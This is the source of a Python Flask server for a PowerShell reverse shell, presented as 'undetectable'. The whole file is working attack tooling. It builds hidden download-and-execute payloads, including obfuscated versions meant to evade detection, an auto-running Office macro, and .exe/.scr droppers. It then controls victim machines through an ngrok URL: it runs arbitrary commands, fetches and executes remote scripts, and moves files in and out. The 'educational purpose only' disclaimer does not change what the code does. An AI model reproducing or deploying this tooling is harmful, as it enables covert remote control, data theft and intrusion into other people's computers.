from flask import Flask, request
import os
import logging
import click
import flask.cli
import sys
import ctypes
import socket
import shutil
import subprocess
import time

def is_admin(platform):
    if platform == "windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    elif platform == "linux":
        ret = 0
        if os.geteuid() != 0:
            msg = "[sudo] password for %u: "
            ret = subprocess.check_call("sudo -v -p '%s'" % msg, shell=True)
        if ret != 0:
            return False
        else:
            return True
    else:
        return False


def get_dir():
    return os.getcwd().replace("\\", "/")


app = Flask(__name__)

# Disable default flask logging
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True
flask.cli.show_server_banner = lambda *args: None

@app.route('/rs', methods = ['GET'])
def reverse_shell():
    if request.method == 'GET':
        command = str(click.prompt(click.style(request.headers.get("input_path")+" ", fg="yellow")))
        if command == "cls": os.system("cls")
        elif command[:7] == "#upload": return f"""Invoke-WebRequest -Uri "{ngrok_url}/sf/upload/{command[command.find('"', 0, -1)+1:command.find('"', command.find('"', 0, -1)+1, -1)]}" -OutFile "{command[command.find('"', command.find('"', command.find('"', 0, -1)+1, -1), -1)+3: -1]}" """, 200
        elif command[:9] == "#download": return f"""$UploadUri = "{ngrok_url}/sf/download/{command[command.find('"', 0, -1)+1:command.find('"', command.find('"', 0, -1)+1, -1)]}";$wc = New-Object System.Net.WebClient;$wc.UploadFile($UploadUri, "{command[command.find('"', command.find('"', command.find('"', 0, -1)+1, -1), -1)+3: -1]}")""", 200
        elif command[:5] == "#load": return f"""Invoke-WebRequest -Uri "{ngrok_url}/scripts/{command[command.find('"', 0, -1)+1:command.find('"', command.find('"', 0, -1)+1, -1)]}" -OutFile "$env:TEMP/rs_script_temp.ps1";cd $env:TEMP;./rs_script_temp.ps1 """, 200
        elif command == "#help": print("""This tool is for educational purpose only and im not responsable for any actions done with it.

Use #help to show this message

Use #download "<filename>" "<dir>" to download <dir> from the client pc to the <filename> in the "shared_files" folder on the server pc
Use #upload "<filename>" "<dir>" to upload <filename> from the "shared_files" dir on the server pc to the <dir> on the client pc
Use #load "<filename>" to load and run a <filename> from the "scripts" folder

Any other inputs will just be executed as a powershell command on the client pc""")
        else: return command
        return "$null"
    else:
        return "", 400

@app.route('/rs/out', methods = ['POST'])
def reverse_shell_out():
    if request.method == 'POST':
        resp = list(request.files.values())[0]
        resp.save(f"C:/Users/{os.getlogin()}/AppData/Local/Temp/powershell_reverse_shell_server_out_temp.txt")
        click.echo(click.style(open(f"C:/Users/{os.getlogin()}/AppData/Local/Temp/powershell_reverse_shell_server_out_temp.txt", "r").read().replace("\x00", "")[3:].replace("\n\n", "\n"), fg="white"))
    return "", 200

@app.route('/c', methods = ['GET'])
def code():
    return open(f"{get_dir()}/code_request/code_request_payload.ps1", "r").read(), 200

@app.route('/sf/upload/<file>', methods = ['GET'])
def shared_files_upload(file):
    return open(f"{get_dir()}/shared_files/{file}", "rb").read(), 200

@app.route('/sf/download/<file>', methods = ['POST'])
def shared_files_download(file):
    if request.method == "POST":
        resp = list(request.files.values())[0]
        resp.save(f"{get_dir()}/shared_files/{file}")
    return "", 200

@app.route('/scripts/<file>', methods = ['GET'])
def get_script(file):
    return open(f"{get_dir()}/scripts/{file}", "rb").read().replace(b"<-URL->", ngrok_url.encode()), 200

if __name__ == "__main__":
    
    # Detects what platform the progeam is being executed on
    if sys.platform == "linux" or sys.platform == "linux2":
        platform = "linux"
        print("Be aware of the fact that this program is mainly build for windows and will therefor have some bugs on linux")
    elif sys.platform == "win32":
        platform = "windows"
    else:
        print("This program is only supported on linux and windows")
        exit()

    # Makes the program require admin privileges
    if not is_admin(platform):
        if platform == "windows":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            print("This program requires admin privileges")
            exit()
        else:
            print("This program requires admin privileges")
            exit()

    if sys.argv[1] == "-h" or sys.argv[1] == "--help" or sys.argv[1] == None:
        print("Syntax: py server.py <ngrok url> <port>")
        input("Press enter to exit... ")
        exit()

    try:
        ngrok_url = str(sys.argv[1])
        port = int(sys.argv[2])
    except Exception as e:
        print(e)
        print("Syntax: py server.py <ngrok url> <port>")
        input("Press enter to exit... ")
        exit()
    
    os.system("cls")

    # Generate payloads
    click.echo(click.style("Removing Old Payloads...", fg="yellow"))
    try:
        shutil.rmtree(f"{get_dir()}/payloads")
        shutil.rmtree(f"{get_dir()}/code_request")
    except Exception as e: print(e)
    os.mkdir(f"{get_dir()}/payloads")
    os.mkdir(f"{get_dir()}/code_request")
    click.echo(click.style("Old Payloads Has Been Removed", fg="green"))

    click.echo(click.style("Generating Payloads...", fg="yellow"))
    # Generating the default payload template
    pure_payload = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'Invoke-Expression (Invoke-WebRequest -Uri " + '"' + ngrok_url + '/c"' + " -Method Get)'"
    # Generating the obfuscated payload template
    open(f"{get_dir()}/external_libraries/Invoke-Stealth/script.ps1.temp", "w").write(pure_payload)
    time.sleep(1)
    os.system("powershell start-process powershell {cd '" + get_dir() + "/external_libraries/Invoke-Stealth';powershell -ExecutionPolicy Bypass -File Invoke-Stealth.ps1 script.ps1.temp -technique BetterXencrypt,ReverseB64}")
    time.sleep(2)
    obfuscated_payload = open(f"{get_dir()}/external_libraries/Invoke-Stealth/script.ps1.temp", "r").read().replace("\n", ";")
    #print(obfuscated_payload)
    # Generating all of the payload files
    open(f"{get_dir()}/payloads/payload.bat", "w").write("powershell start-process powershell {" + pure_payload + "}")
    open(f"{get_dir()}/payloads/payload.ps1", "w").write(pure_payload)
    open(f"{get_dir()}/payloads/obfuscated_payload.bat", "w").write("powershell start-process powershell {" + obfuscated_payload + "}")
    open(f"{get_dir()}/payloads/obfuscated_payload.ps1", "w").write(obfuscated_payload)
    open(f"{get_dir()}/payloads/payload.bas", "w").write("""
Attribute VB_Name = "payload"
Sub AutoExec()
    Shell "powershell start-process powershell {powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'Invoke-Expression (Invoke-WebRequest -Uri "" """ + ngrok_url + """ "" -Method Get)'}", vbNormalFocus
End Sub
""")
    open(f"{get_dir()}/payloads/obfuscated_payload.bas", "w").write("""
Attribute VB_Name = "payload"
Sub AutoExec()
    Shell "powershell start-process powershell {""" + obfuscated_payload.replace('"', "'") + """}", vbNormalFocus
End Sub
""")
    open(f"{get_dir()}/payloads/generate-exe-and-scr-payload.ps1", "w").write("""
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

if (!(Get-Module -ListAvailable -Name "ps2exe")) {
    Install-Module ps2exe
}
Import-Module ps2exe

Invoke-ps2exe -inputFile "payload.ps1" -outputFile "payload.exe" -noConsole
Copy-Item -Path "payload.exe" -Destination "payload.scr"


""")
    os.system("powershell start-process powershell {cd '" + get_dir() + "/payloads';powershell -ExecutionPolicy Bypass -File generate-exe-and-scr-payload.ps1}")
    open(f"{get_dir()}/code_request/code_request_payload.ps1", "w").write("""
$Uri = """ + '"' + ngrok_url + '/rs"' + """
$wc = New-Object System.Net.WebClient
while ($true) {
    $Data = @{
        "input_path" = "PS " + $pwd + ">"
    }
    $Response = Invoke-WebRequest -Uri $Uri -Method Get -Headers $Data
    Invoke-Expression ([string]($Response.Content)) | Out-File "$env:TEMP/rs_last_out_temp"
    $wc.UploadFile($Uri + "/out", "$env:TEMP/rs_last_out_temp")
    Remove-Item "$env:TEMP/rs_last_out_temp"
}
""")
    click.echo(click.style('Payloads Saved To "', fg="green") + click.style(f'{get_dir()}/payloads', fg="cyan") + click.style('"', fg="green"))

    # Cleaning up temp files
    #click.echo(click.style("Removing Payload Temp Files...", fg="yellow"))
    #os.remove(f"{get_dir()}/payloads/generate-exe-and-scr-payload.ps1")
    #click.echo(click.style("Payload Temp Files Removed", fg="green"))
    

    # Print info text
    click.echo(click.style("""
 _____   _____            _____                                 _____ _          _ _ 
|  __ \ / ____|          |  __ \                               / ____| |        | | |
| |__) | (___    ______  | |__) |_____   _____ _ __ ___  ___  | (___ | |__   ___| | |
|  ___/ \___ \  |______| |  _  // _ \ \ / / _ \ '__/ __|/ _ \  \___ \| '_ \ / _ \ | |
| |     ____) |          | | \ \  __/\ V /  __/ |  \__ \  __/  ____) | | | |  __/ | |
|_|    |_____/           |_|  \_\___| \_/ \___|_|  |___/\___| |_____/|_| |_|\___|_|_|
                                                                                      
                                                                                      """, fg="red"))
    click.echo(click.style("An advanced undetectable reverse shell solution for powershell", fg="green"))
    print("------------------------------------------------------------------------")
    click.echo(click.style("This program is for educational purpose only. The developer is NOT responsable for what the program is being used for", fg="red"))
    print("")
    print("")
    click.echo(click.style('Local: Server listining on "', fg="yellow") + click.style(f'{socket.gethostbyname(socket.gethostname())}:{port}', fg="cyan") + click.style('"', fg="yellow"))
    click.echo(click.style('Ngrok: Server listining on "', fg="yellow") + click.style(f'{ngrok_url}', fg="cyan") + click.style('"', fg="yellow"))
    print("")
    click.echo(click.style('Run "', fg="green") + click.style("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'Invoke-Expression (Invoke-WebRequest -Uri " + '"' + ngrok_url + '/c"' + " -Method Get)'", fg="cyan") + click.style('" in powershell on the target PC', fg="green"))
    click.echo(click.style('Or run one of the files from "', fg="green") + click.style(f"{get_dir()}/payloads", fg="cyan") + click.style('" on the target PC', fg="green"))
    print("")
    print("")

    app.run(host="0.0.0.0", port=port)